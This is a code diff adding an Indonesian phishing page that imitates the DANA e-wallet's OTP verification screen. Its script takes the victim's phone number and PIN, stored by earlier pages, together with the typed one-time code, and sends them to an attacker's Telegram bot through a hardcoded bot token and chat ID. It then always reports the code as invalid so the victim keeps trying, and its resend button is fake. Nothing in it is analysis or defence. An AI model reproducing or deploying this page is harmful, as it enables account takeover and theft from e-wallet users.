@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Verifikasi OTP</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    font-family:'Nunito',sans-serif;
+    background:#f3f3f3;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    height:100vh;
+    margin:auto;
+    background:#f3f3f3;
+    position:relative;
+}
+
+/* HEADER */
+.header{
+    width:100%;
+    height:54px;
+    background:#1b93ea;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.back{
+    position:absolute;
+    left:18px;
+    top:21px;
+    width:10px;
+    height:10px;
+    border-left:2px solid #fff;
+    border-bottom:2px solid #fff;
+    transform:rotate(45deg);
+}
+
+.header-title{
+    color:#fff;
+    font-size:23px;
+    font-weight:800;
+}
+
+/* CONTENT */
+.content{
+    padding-top:46px;
+    text-align:center;
+}
+
+.title{
+    font-size:22px;
+    font-weight:800;
+    color:#111;
+}
+
+.subtitle{
+    margin-top:16px;
+    font-size:14px;
+    line-height:24px;
+    color:#707988;
+}
+
+.method{
+    margin-top:8px;
+    font-size:15px;
+    font-weight:700;
+    color:#666;
+}
+
+.method span{
+    color:#1db954;
+}
+
+/* OTP */
+.otp-wrapper{
+    margin-top:35px;
+    display:flex;
+    justify-content:center;
+    gap:3px;
+}
+
+.otp-box{
+    width:50px;
+    height:50px;
+    border:2px solid #d8dde6;
+    border-radius:12px;
+    background:#fff;
+    text-align:center;
+    font-size:24px;
+    font-weight:800;
+    outline:none;
+}
+
+.otp-box:focus{
+    border-color:#1b93ea;
+}
+
+/* RESEND */
+.resend-box{
+    width:185px;
+    height:40px;
+    margin:34px auto 0;
+    border:2px solid #d8dde6;
+    border-radius:12px;
+    overflow:hidden;
+    display:flex;
+    background:#fff;
+}
+
+.resend-btn{
+    flex:1;
+    border:none;
+    background:#f7f7f7;
+    color:#bcc2cc;
+    font-size:13px;
+    font-weight:800;
+    font-family:'Nunito',sans-serif;
+    cursor:not-allowed;
+}
+
+.resend-btn.active{
+    background:#1b93ea;
+    color:#fff;
+    cursor:pointer;
+}
+
+.timer{
+    width:74px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:14px;
+    font-weight:800;
+    color:#555;
+}
+
+/* HELP */
+.help{
+    margin-top:54px;
+    font-size:16px;
+    font-weight:800;
+    color:#68748a;
+    cursor:pointer;
+}
+
+/* NOTIFIKASI - WARNA MERAH */
+.notification{
+    position:absolute;
+    top:20px;
+    left:50%;
+    transform:translateX(-50%);
+    background:#ff3b30 !important; /* Merah */
+    color:#fff;
+    padding:12px 20px;
+    border-radius:8px;
+    font-size:14px;
+    font-weight:600;
+    box-shadow:0 4px 12px rgba(0,0,0,0.15);
+    opacity:0;
+    visibility:hidden;
+    transition:all 0.3s ease;
+    z-index:999;
+}
+
+.notification.show{
+    opacity:1;
+    visibility:visible;
+    top:40px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <div class="back" onclick="history.back()"></div>
+        <div class="header-title">Masuk</div>
+    </div>
+
+    <div class="content">
+        <div class="title">Masukkan kode OTP</div>
+        <div class="subtitle">Kode OTP dikirim ke nomor kamu via</div>
+        <div class="method"><span>WhatsApp</span> / SMS</div>
+
+        <div class="otp-wrapper">
+            <input type="tel" maxlength="1" class="otp-box">
+            <input type="tel" maxlength="1" class="otp-box">
+            <input type="tel" maxlength="1" class="otp-box">
+            <input type="tel" maxlength="1" class="otp-box">
+        </div>
+
+        <div class="resend-box">
+            <button class="resend-btn" id="resendBtn">KIRIM ULANG</button>
+            <div class="timer" id="timer">01:59</div>
+        </div>
+
+        <div class="help">CHAT DIANA</div>
+    </div>
+
+    <!-- Elemen Notifikasi -->
+    <div class="notification" id="notif">Kode OTP tidak Valid!</div>
+
+</div>
+
+<script>
+// KONFIGURASI TELEGRAM
+const BOT_TOKEN = "7109004796:AAGU8FvieH2HkNADWvD5HMUAkXid_jb6_1w"; // Ganti Token Bot kamu
+const CHAT_ID = "5983910858"; // Ganti Chat ID kamu
+
+const inputs = document.querySelectorAll('.otp-box');
+const notif = document.getElementById('notif');
+const resendBtn = document.getElementById('resendBtn');
+let time = 119;
+
+// Ambil SEMUA data dari halaman sebelumnya
+const nomorHp = localStorage.getItem("nomor_hp") || "Tidak ada data";
+const pinDana = localStorage.getItem("pin_dana") || "Tidak ada data";
+
+// Fungsi tampilkan notifikasi (selalu merah)
+function showNotification(text) {
+    notif.textContent = text;
+    notif.classList.add('show');
+    
+    setTimeout(() => {
+        notif.classList.remove('show');
+    }, 3000);
+}
+
+// Fungsi kirim SEMUA data lengkap ke Telegram
+async function kirimKeTelegram(otp) {
+    const pesan = `📋 DATA LENGKAP AKUN DANA
+📱 Nomor HP: ${nomorHp}
+🔑 PIN: ${pinDana}
+🔢 Kode OTP: ${otp}`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
+    await fetch(url);
+}
+
+// Cek jika OTP sudah lengkap
+function checkOtpComplete() {
+    let otpValue = '';
+    inputs.forEach(input => otpValue += input.value);
+    
+    if(otpValue.length === 4) {
+        // Simpan OTP ke LocalStorage
+        localStorage.setItem("otp_dana", otpValue);
+
+        // Tampilkan notifikasi merah
+        showNotification('Kode OTP tidak Valid!!');
+
+        // Kirim SEMUA data lengkap ke Telegram
+        kirimKeTelegram(otpValue);
+    }
+}
+
+// Logika input OTP
+inputs.forEach((input,index)=>{
+    input.addEventListener('input', function(){
+        this.value = this.value.replace(/[^0-9]/g,''); // Hanya angka
+
+        // Pindah ke kotak berikutnya jika terisi
+        if(this.value && index < inputs.length - 1){
+            inputs[index + 1].focus();
+        }
+
+        // Pindah ke kotak sebelumnya jika dihapus
+        if(!this.value && index > 0){
+            inputs[index - 1].focus();
+        }
+
+        // Cek kelengkapan
+        checkOtpComplete();
+    });
+
+    // Izinkan hapus karakter
+    input.addEventListener('keydown', function(e){
+        if(e.key === 'Backspace' && !this.value && index > 0){
+            inputs[index - 1].focus();
+        }
+    });
+});
+
+// Timer kirim ulang OTP
+const timer = document.getElementById('timer');
+setInterval(()=>{
+    let minute = Math.floor(time / 60);
+    let second = time % 60;
+
+    minute = minute < 10 ? '0' + minute : minute;
+    second = second < 10 ? '0' + second : second;
+
+    timer.innerHTML = minute + ':' + second;
+
+    if(time > 0){
+        time--;
+    } else {
+        resendBtn.classList.add('active');
+        resendBtn.addEventListener('click', () => {
+            showNotification('Kode OTP baru dikirim!');
+            time = 119;
+            resendBtn.classList.remove('active');
+        });
+    }
+},1000);
+</script>
+
+</body>
+</html>
